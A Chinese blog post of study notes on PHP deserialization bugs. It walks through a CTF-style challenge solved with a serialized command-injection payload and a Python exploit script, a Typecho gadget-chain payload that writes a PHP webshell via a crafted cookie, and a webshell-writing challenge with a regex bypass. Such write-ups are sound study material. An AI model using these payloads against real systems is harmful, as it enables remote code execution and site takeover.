---
title: 'php反序列化笔记1'
date: 2019-08-11
updated: 2019-08-12
category: '未分类'
tags:
  - 'php'
  - '反序列化'
lang: 'zh'
draft: false
---
在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。

文章中的代码如下：

```php
<?php

error_reporting(0);

class come{    

   private $method;

   private $args;

   function __construct($method, $args) {

       $this->method = $method;

       $this->args = $args;

    }

   function __wakeup(){

       foreach($this->args as $k => $v) {

           $this->args[$k] = $this->waf(trim($v));

       }

    }

   function waf($str){

       $str=preg_replace("/[<>*;|?\n ]/","",$str);

       $str=str_replace('flag','',$str);

       return $str;

   }           

   function echos($host){

       system("echos $host".$host);

    }

   function __destruct(){

       if (in_array($this->method, array("echos"))) {

           call_user_func_array(array($this, $this->method), $this->args);

       }

    }

}

$first='hi';

$var='var';

$bbb='bbb';

$ccc='ccc';

$i=1;

foreach($_GET as $key => $value) {

       if($i===1)

       {

           $i++;   

           $$key = $value;

       }

       else{break;}

}

if($first==="doller")

{
   var_dump($_GET['a']);
   @parse_str($_GET['a']);

   if($var==="give")

    {

       if($bbb==="me")

       {

           if($ccc==="flag")

           {

                echo"<br>welcome!<br>";

                $come=@$_POST['come'];

                unserialize($come); 

           }

       }

       else

       {echo "<br>think about it<br>";}

    }

   else

    {

       echo "NO";

    }

}

else

{

   echo "Can you hack me?<br>";

}

?>
```

有两个小trick需要绕过，都是变量覆盖的漏洞，同时parse\_str函数需要接受的是一个字符串，为了在浏览器栏中输入需要将&符号进行URL编码

`http://localhost/test/unserialize.php?first=doller&a=var=give%26bbb=me%26ccc=flag`

这样就能绕过两个小trick

之后就是怎么利用那个反序列化了，`__construct`函数没有什么用，`__wakeup`方法会将私有属性`args`通过一个waf函数进行过滤，`__destruct`函数中有一个危险函数`call_user_func_array`,注意到调用这个函数的时候传入的是一个数组，其实就是调用这个this类中的一个方法。但是之前的if判断限制了调用的方法只能是`echos`，分析`echos`方法发现其中有一个`system`函数，但是`echo`错误的拼成了`echos` :laughing:

于是我们的思路就是通过传入反序列化后的值使得echos函数被调用执行我们的命令，这就设计到在Linux或者Windows中一行执行多条命令的方式。

在Linux中：

> &是不管前后命令是否执行成功都会执行前后命令  
> &&是前面的命令执行成功才能执行后面的命令  
> ||是前面的命令执行不成功才能执行后面的命令  
> |管道符

构造出反序列化数据如下：

`O:4:"come":2:{s:10:"comeargs";a:1:{i:0;s:4:"&dir";}s:12:"comemethod";s:5:"echos";}`

但是。。。  
![](https://i.loli.net/2019/08/11/KREArj6U48vMnsl.png)

`var_dump`一下发现了：

`:\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:"come":2:{s:10:"comeargs";a:1:{i:0;s:4:"' (length=44)`

发现数据被截断了。。

var\_dump之前的构造的反序列化数据：

```
O:4:"come":2:{s:10:"comeargs";a:1:{i:0;s:4:"&dir";}s:12:"comemethod";s:5:"echos";}F:\notes\audit\test.php:8:  ---> echo出来的结果
string(86) "O:4:"come":2:{s:10:"\000come\000args";a:1:{i:0;s:4:"&dir";}s:12:"\000come\000method";s:5:"echos";}" ---> var_dump出来的结果
```

因为php在反序列化数据时：

> protected属性的表示方式是在变量名前加个%00\*%00  
> private表示方式是在变量名前加上%00类名%00

所以次数的两个`private`属性都被加上了00阶段符号，于是只能通过python手动编码传输数据了

```python
import requests

url = "http://localhost/test/unserialize.php?first=doller&a=var=give%26bbb=me%26ccc=flag"

n = '00'.decode('hex')
o = 'O:4:"come":2:{s:12:"'+n+'come'+n+'method";s:5:"echos";s:10:"'+n+'come'+n+'args";a:1:{i:0;s:4:"&dir";}}"'

r = requests.post(url, data={"come":o})
print r.text
```

返回的结果如下：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/unphp0.png)

之后如果要读取flag还有几个姿势，但不是本文的重点了

## typecho反序列化漏洞

先放出payload

```php
<?php
 
class Typecho_Request
{
 private $_filter=array("assert");
 private $_params=array("screenName"=>"file_put_contents('jrxnm.php', '<?php eval(\$_GET[jrxnm]);');");	
}
 
 
class Typecho_Feed
{
	private $_items = array();
	private $_type = 'RSS 2.0';
	function __construct(){
		$item['author'] = new Typecho_Request();
		$this->_items[0] = $item;
	}
	
}
 
$abc = new Typecho_Feed();
echo base64_encode(serialize(array("adapter"=>$abc,"prefix"=>"_typecho")));
```

序列化一个数组之后作为cookie传入，关键代码：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typ1.png)

此处`$config`接收cookie中的参数，那么`$config`此时就是一个数组:

`$config = array("adapter"=>$abc, "prefix"=>"_typecho")`

其中`adapter`键对应的是一个对象。

![](https://i.loli.net/2019/08/11/B4SNL1EYOhpzu9r.png)

然后`$config`的两个键值对应的value都作为参数进入了一个类。

查看该类的构造方法发现存在字符串拼接：

![](https://i.loli.net/2019/08/11/vfe6cAPLjRZNr3o.png)

那么查找`__toString()`魔术方法，我们发现在`Feed.php`文件中的一个类：Typecho\_Feed

![](https://i.loli.net/2019/08/11/D1mYMOHZiAgNwlt.png)

`$item['author']->screenName`如果$item\[‘author’\] 是一个对象，且不存在screenName属性时，会自动调用\_\_get魔法函数。

于是我们想要在实例化Typecho\_Db类的时候，调用`Typecho_Feed`类中的`__toString`方法

此时继续寻找`__get`方法：

在Request.php文件中有一个类Typecho\_Request中的`__get`方法如下：

```php
/**
 * 获取实际传递参数(magic)
 *
 * @access public
 * @param string $key 指定参数
 * @return void
 */
public function __get($key)
{
    return $this->get($key);
}
```

继续分析get方法：

```php
public function get($key, $default = NULL)
{
    $value = $default;

    switch (true) {
        case isset($this->_params[$key]):
            $value = $this->_params[$key];
            break;
        case isset($_GET[$key]):
            $value = $_GET[$key];
            break;
        case isset($_POST[$key]):
            $value = $_POST[$key];
            break;
        case isset($_COOKIE[$key]):
            $value = $_COOKIE[$key];
            break;
        default:
            $value = $default;
            break;
    }

    $value = is_array($value) || strlen($value) > 0 ? $value : $default;
    return $this->_filter ? $this->_applyFilter($value) : $value;
}
```

如果`$this->_filter`，就会调用`_applyFilter`方法：

```php
private function _applyFilter($value)
{
    if ($this->_filter) {
        foreach ($this->_filter as $filter) {
            $value = is_array($value) ? array_map($filter, $value) :
            call_user_func($filter, $value);
        }
    }

    $this->_filter = array();
    return $value;
}
```

此时终于看到了`call_user_func`方法，函数名是`this->_filter`

## 再看一道反序列化

\`\`php  
<?php  
class Template{  
public $cacheFile = ‘/tmp/cachefile’;  
public $template = ‘

welcome back %s

‘;

```
public function __construct($data=null)
{
    $data=$this->lodaData($data);
    $this->render($data);
}

public function loadData($data){
    if(substr($data, 0, 2) !== '0:' && !preg_match('/0:\d:\/', $data)){
        return unserialize($data);
    }
    return [];
}

public function createCache($file=null, $tpl=null){
    $file = $file ?? $this->cacheFile;
    $tpl = $tpl ?? $this->template;
    file_put_contents($file, $tpl);
}

public function render($data){
    echo sprintf($this->template, htmlspecialchars($data['name']));
}

public function __destruct()
{
    $this->createCache();
}
```

}

new Template($\_COOKIE\[‘data’\]);

````

这道题也是反序列化的应用，利用思路很清晰就是通过`__destruct`调用`createCache`写入一个webshell

重点在于这里：

```php
    public function loadData($data){
        if(substr($data, 0, 2) !== '0:' && !preg_match('/0:\d:\/', $data)){
            return unserialize($data);
        }
        return [];
    }
````

如果绕过这个if判断，这里需要分析一下php的源码：在’O:’,后面可以增加’+’，用来绕过正则判断。

## 参考

[PHP反序列化漏洞简介及相关技巧小结](https://www.freebuf.com/articles/web/209975.html)
